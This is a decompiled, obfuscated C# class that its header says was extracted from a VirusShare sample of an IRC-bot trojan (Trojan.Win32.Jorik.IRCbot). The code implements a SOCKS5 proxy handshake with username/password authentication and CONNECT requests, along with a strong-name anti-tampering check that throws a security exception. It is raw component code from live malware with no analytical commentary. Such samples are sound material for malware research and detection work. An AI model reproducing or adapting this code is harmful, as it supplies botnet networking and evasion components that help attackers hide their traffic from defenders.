// Decompiled with JetBrains decompiler
// Type: .
// Assembly: insomnia, Version=0.0.0.0, Culture=neutral, PublicKeyToken=24b8f1c2e28acde2
// MVID: 0C7B899D-7035-4B2D-B433-3C80E566FC1C
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00001-msil\Trojan.Win32.Jorik.IRCbot.gim-3e8d8a98ac44098acc3d92301b4ae92e5e6e1a5f0b2d861cd9e69e0650edce63.exe

using \u0004;
using \u0006;
using System;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;

namespace \u0006
{
  internal sealed class \u0002
  {
    [NonSerialized]
    internal static \u0008.\u0004 \u0094;

    private \u0002()
    {
    }

    public static Socket \u0001(
      [In] string obj0,
      [In] int obj1,
      [In] string obj2,
      [In] ushort obj3,
      [In] string obj4,
      [In] string obj5)
    {
      IPAddress ipAddress = (IPAddress) null;
      Socket socket;
      byte[] numArray1;
      byte[] numArray2;
      ushort num1;
      if (true)
      {
        numArray1 = new byte[257];
        numArray2 = new byte[257];
        IPAddress address;
        try
        {
          address = \u0088.\u0001\u0003(obj0);
        }
        catch (FormatException ex)
        {
          address = \u0087.\u007E\u009F\u0002((object) \u0086.\u009E\u0002(obj0))[0];
        }
        try
        {
          ipAddress = \u0088.\u0001\u0003(obj2);
        }
        catch (FormatException ex)
        {
        }
        IPEndPoint ipEndPoint = new IPEndPoint(address, obj1);
        socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        \u0094.\u007E\u001A\u0003((object) socket, (EndPoint) ipEndPoint);
        ushort num2 = 0;
        byte[] numArray3 = numArray1;
        int index1 = (int) num2;
        ushort num3 = (ushort) (index1 + 1);
        numArray3[index1] = (byte) 5;
        byte[] numArray4 = numArray1;
        int index2 = (int) num3;
        ushort num4 = (ushort) (index2 + 1);
        numArray4[index2] = (byte) 2;
        byte[] numArray5 = numArray1;
        int index3 = (int) num4;
        ushort num5 = (ushort) (index3 + 1);
        numArray5[index3] = (byte) 0;
        byte[] numArray6 = numArray1;
        int index4 = (int) num5;
        ushort num6 = (ushort) (index4 + 1);
        numArray6[index4] = (byte) 2;
        int num7 = \u008F.\u007E\u0014\u0003((object) socket, numArray1, (int) num6, SocketFlags.None);
        if (\u008F.\u007E\u0015\u0003((object) socket, numArray2, 2, SocketFlags.None) != 2)
          throw new Exception();
        if (numArray2[1] == byte.MaxValue)
        {
          \u0013.\u007E\u0003\u0002((object) socket);
          throw new Exception();
        }
        num1 = (ushort) 0;
      }
      else
        goto label_16;
label_11:
      byte[] numArray7 = numArray1;
      int index5 = (int) num1;
      ushort num8 = (ushort) (index5 + 1);
      numArray7[index5] = (byte) 5;
      byte[] numArray8 = numArray1;
      int index6 = (int) num8;
      ushort num9 = (ushort) (index6 + 1);
      int num10 = (int) (byte) \u0019.\u007E\u001C\u0002((object) obj4);
      numArray8[index6] = (byte) num10;
      byte[] numArray9 = \u0081.\u007E\u008F\u0002((object) \u0080.\u008B\u0002(), obj4);
      \u0098\u0002.\u007E\u0086\u0004((object) numArray9, (Array) numArray1, (int) num9);
      ushort num11 = (ushort) ((uint) num9 + (uint) (ushort) numArray9.Length);
      byte[] numArray10 = numArray1;
      int index7 = (int) num11;
      ushort num12 = (ushort) (index7 + 1);
      int num13 = (int) (byte) \u0019.\u007E\u001C\u0002((object) obj5);
      numArray10[index7] = (byte) num13;
      byte[] numArray11 = \u0081.\u007E\u008F\u0002((object) \u0080.\u008B\u0002(), obj5);
      \u0098\u0002.\u007E\u0086\u0004((object) numArray11, (Array) numArray1, (int) num12);
      ushort num14 = (ushort) ((uint) num12 + (uint) (ushort) numArray11.Length);
      int num15 = \u008F.\u007E\u0014\u0003((object) socket, numArray1, (int) num14, SocketFlags.None);
      if (\u008F.\u007E\u0015\u0003((object) socket, numArray2, 2, SocketFlags.None) != 2)
        throw new Exception();
      if (numArray2[1] != (byte) 0)
        throw new Exception();
      ushort num16 = 0;
      byte[] numArray12 = numArray1;
      int index8 = (int) num16;
      ushort num17 = (ushort) (index8 + 1);
      numArray12[index8] = (byte) 5;
      byte[] numArray13 = numArray1;
      int index9 = (int) num17;
      ushort num18 = (ushort) (index9 + 1);
      numArray13[index9] = (byte) 1;
      byte[] numArray14 = numArray1;
      int index10 = (int) num18;
      num1 = (ushort) (index10 + 1);
      numArray14[index10] = (byte) 0;
      if (ipAddress == null)
      {
        byte[] numArray15 = numArray1;
        int index11 = (int) num1;
        ushort num19 = (ushort) (index11 + 1);
        numArray15[index11] = (byte) 3;
        byte[] numArray16 = numArray1;
        int index12 = (int) num19;
        ushort num20 = (ushort) (index12 + 1);
        int num21 = (int) \u0099\u0002.\u0087\u0004(\u0019.\u007E\u001C\u0002((object) obj2));
        numArray16[index12] = (byte) num21;
        byte[] numArray17 = \u0081.\u007E\u008F\u0002((object) \u0080.\u008B\u0002(), obj2);
        \u0098\u0002.\u007E\u0086\u0004((object) numArray17, (Array) numArray1, (int) num20);
        num1 = (ushort) ((uint) num20 + (uint) (ushort) numArray17.Length);
        goto label_20;
      }
label_16:
      switch (\u008B.\u007E\u0005\u0003((object) ipAddress))
      {
        case AddressFamily.InterNetwork:
          byte[] numArray18 = numArray1;
          int index13 = (int) num1;
          ushort num22 = (ushort) (index13 + 1);
          numArray18[index13] = (byte) 1;
          byte[] numArray19 = \u0092\u0002.\u007E\u007F\u0004((object) ipAddress);
          \u0098\u0002.\u007E\u0086\u0004((object) numArray19, (Array) numArray1, (int) num22);
          num1 = (ushort) ((uint) num22 + (uint) (ushort) numArray19.Length);
          break;
        case AddressFamily.InterNetworkV6:
          byte[] numArray20 = numArray1;
          int index14 = (int) num1;
          ushort num23 = (ushort) (index14 + 1);
          numArray20[index14] = (byte) 4;
          byte[] numArray21 = \u0092\u0002.\u007E\u007F\u0004((object) ipAddress);
          \u0098\u0002.\u007E\u0086\u0004((object) numArray21, (Array) numArray1, (int) num23);
          num1 = (ushort) ((uint) num23 + (uint) (ushort) numArray21.Length);
          break;
      }
label_20:
      byte[] numArray22 = \u0093\u0002.\u0080\u0004(obj3);
      for (int index15 = numArray22.Length - 1; index15 >= 0; --index15)
        numArray1[(int) num1++] = numArray22[index15];
      int num24 = \u008F.\u007E\u0014\u0003((object) socket, numArray1, (int) num1, SocketFlags.None);
      if (true)
      {
        int num25 = \u009A\u0002.\u007E\u0088\u0004((object) socket, numArray2);
        if (numArray2[1] != (byte) 0)
          throw new Exception();
        return socket;
      }
      goto label_11;
    }

    static \u0002()
    {
      do
      {
        \u0005.\u0001(typeof (\u0002));
        bool flag = false;
        Assembly assembly = \u007F.\u0089\u0002();
        if (\u0002.\u0001(\u0003.\u007E\u0006((object) assembly), true, out flag))
          goto label_7;
label_5:
        throw new SecurityException(\u0002.\u0094(738));
label_7:
        int num = flag ? 1 : 0;
        if (true)
        {
          if (num != 0)
            num = \u0005.\u007E\u0082((object) \u0003.\u007E\u0007((object) assembly), \u0002.\u0094(713)) ? 1 : 0;
          else
            goto label_5;
        }
        if (num == 0)
          goto label_5;
      }
      while (false);
    }

    [DllImport("mscorwks.dll", EntryPoint = "StrongNameSignatureVerificationEx", CharSet = CharSet.Unicode)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool \u0001([MarshalAs(UnmanagedType.LPWStr)] string _param0, [MarshalAs(UnmanagedType.Bool)] bool _param1, [MarshalAs(UnmanagedType.Bool)] out bool _param2);
  }
}
